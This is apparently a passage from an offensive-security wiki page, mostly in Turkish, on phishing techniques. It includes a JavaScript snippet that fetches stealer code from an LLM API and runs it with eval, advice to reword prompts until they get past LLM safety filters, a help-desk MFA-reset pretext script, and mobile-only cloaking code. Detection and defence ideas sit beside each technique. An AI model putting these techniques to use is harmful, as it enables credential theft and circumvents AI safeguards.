## AI-Enhanced Phishing Operations
Attackers artık tamamen kişiselleştirilmiş lure'lar ve gerçek zamanlı interaction için **LLM & voice-clone APIs**'lerini zincirliyor.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Rastgeleleştirilmiş ifadeler ve tracking link'leriyle >100 k email / SMS üretip gönderme.|
|Generative AI|Public M&A bilgilerine ve social media'dan alınan inside joke'lara atıfta bulunan *one-off* email'ler üretme; callback scam'de deep-fake CEO voice kullanma.|
|Agentic AI|Domain'leri otonom olarak register etme, open-source intel scrape etme ve victim link'e tıklayıp credential'larını göndermediğinde next-stage mail'leri hazırlama.|

**Defence:**
• ARC/DKIM anomalies üzerinden untrusted automation tarafından gönderilen mesajları vurgulayan **dynamic banners** ekleyin.
• High-risk phone request'ler için **voice-biometric challenge phrases** kullanıma alın.
• Awareness programme'lerinde AI-generated lure'ları sürekli olarak simulate edin – static template'ler artık obsolete.

See also – credential phishing için agentic browsing abuse:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – secrets inventory ve detection için AI agent abuse of local CLI tools and MCP:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers, **trusted LLM API**'den JavaScript isteyerek ve bunu browser içinde çalıştırarak (ör. `eval` veya dynamic `<script>`) zararsız görünen HTML gönderebilir ve **stealer'ı runtime'da generate edebilir**.<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** Exfil URL'lerini/Base64 string'lerini prompt içine encode edin; safety filter'larını aşmak ve hallucination'ları azaltmak için ifadeleri iteratif olarak değiştirin.
2. **Client-side API call:** Load sırasında JS, public bir LLM'yi (Gemini/DeepSeek/etc.) veya bir CDN proxy'sini çağırır; static HTML içinde yalnızca prompt/API call bulunur.
3. **Assemble & exec:** Response'u concatenate edin ve çalıştırın (her visit'te polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code lure'ı kişiselleştirir (ör. LogoKit token parsing) ve kimlik bilgilerini prompt-hidden endpoint'e gönderir.

**Evasion traits**
- Traffic, well-known LLM domains veya reputable CDN proxies üzerinden geçer; bazen bir backend'e WebSockets aracılığıyla bağlanır.
- Statik payload yoktur; malicious JS yalnızca render sonrasında mevcut olur.
- Non-deterministic generations, her session için **unique** stealer'lar üretir.

**Detection ideas**
- JS etkin sandbox'lar çalıştırın; **LLM responses kaynaklı runtime `eval`/dynamic script creation** işlemlerini işaretleyin.
- LLM API'lerine yapılan front-end POST isteklerinin hemen ardından dönen metin üzerinde `eval`/`Function` kullanımını arayın.
- Client traffic içinde yetkisiz LLM domains ve ardından yapılan credential POST'ları için alarm oluşturun.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Classic push-bombing'in yanı sıra operatörler help-desk görüşmesi sırasında doğrudan **yeni bir MFA registration'ı zorunlu kılarak** kullanıcının mevcut token'ını geçersiz hale getirir. Bundan sonraki herhangi bir login prompt'u kurbana meşru görünür.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta olaylarını izleyin; **`deleteMFA` + `addMFA`** olaylarının **aynı IP’den dakikalar içinde** gerçekleşip gerçekleşmediğini kontrol edin.



## Clipboard Hijacking / Pastejacking

Saldırganlar, ele geçirilmiş veya typosquatting uygulanmış bir web sayfasından kötü amaçlı komutları kurbanın panosuna sessizce kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** veya bir terminal penceresine yapıştırmaya yönlendirerek herhangi bir indirme veya ek olmadan rastgele kod çalıştırabilir.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### QR sosyal mühendisliği yoluyla WhatsApp cihaz bağlantısı ele geçirme
* Bir lure sayfası (ör. sahte bakanlık/CERT “kanalı”), bir WhatsApp Web/Desktop QR kodu görüntüler ve kurbana bunu taramasını söyleyerek saldırganı sessizce **linked device** olarak ekler.<sup>[[12]](#references)</sup>
* Saldırgan, oturum kaldırılana kadar sohbet/kişi görünürlüğü elde eder. Kurbanlar daha sonra “yeni cihaz bağlandı” bildirimi görebilir; savunmacılar, güvenilmeyen QR sayfalarına yapılan ziyaretlerden kısa süre sonra gerçekleşen beklenmedik cihaz bağlantısı olaylarını arayabilir.

### Crawler/sandbox'ları atlatmak için mobil cihazla sınırlandırılmış phishing
Operatörler, desktop crawler'larının son sayfalara hiçbir zaman ulaşamaması için phishing akışlarını giderek daha fazla basit bir cihaz kontrolünün arkasında sınırlandırıyor. Yaygın bir yöntem, dokunmatik özellikli bir DOM'u test eden ve sonucu bir server endpoint'ine gönderen küçük bir script kullanmaktır; non-mobile istemciler HTTP 500 (veya boş bir sayfa) alırken mobile kullanıcılarına akışın tamamı sunulur.<sup>[[7]](#references)</sup>

Minimal client snippet (tipik mantık):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantığı (basitleştirilmiş):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Sunucu davranışı sıklıkla şu şekilde gözlemlenir:
- İlk yükleme sırasında bir session cookie ayarlar.
- `POST /detect {"is_mobile":true|false}` isteğini kabul eder.
- `is_mobile=false` olduğunda sonraki GET isteklerine 500 (veya placeholder) döndürür; phishing içeriğini yalnızca `true` olduğunda sunar.

Hunting ve detection heuristics:
- urlscan sorgusu: `filename:"detect_device.js" AND page.status:500`
- Web telemetrisi: `GET /static/detect_device.js` → `POST /detect` → mobil olmayan istemci için HTTP 500 dizisi; legitimate mobil victim path'leri ise devamındaki HTML/JS ile birlikte 200 döndürür.
- İçeriği yalnızca `ontouchstart` veya benzer device check'lerine göre koşullandıran sayfaları engelleyin veya incelemeye alın.

Defence tips:
- Gated content'i ortaya çıkarmak için crawler'ları mobile-like fingerprint'ler ve etkin JS ile çalıştırın.
- Newly registered domain'lerde `POST /detect` sonrasında gelen şüpheli 500 yanıtları için alert oluşturun.

## References

- [1] [Phishing'de Kullanılan Domain Varyasyonlarını Oluşturma (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Phishing'i Bulma: Araçlar ve Teknikler (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [noVNC Kullanarak Credentials Çalma ve 2FA Bypass Etme (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [EvilnoVNC ile Session Çalma ve 2FA Bypass Etme (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Debian Wheezy'de Postfix ile DKIM Kurulumu ve Yapılandırması (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing altyapısı ve heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacks için Sıradaki Sınır: Real Time'da Phishing JavaScript Üretmek için LLM'lerden Yararlanma](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking ve TDS: Bir Malware Distribution Ecosystem'inin İçinden](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Bitflipping ile Microsoft'un windows.com Trafiğini Hijacking Etme (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: Pakistan'daki Hedefli Spyware Campaign'inde Lure Olarak Kullanılan Fake Dating App](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC'leri ve Sample'ları](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
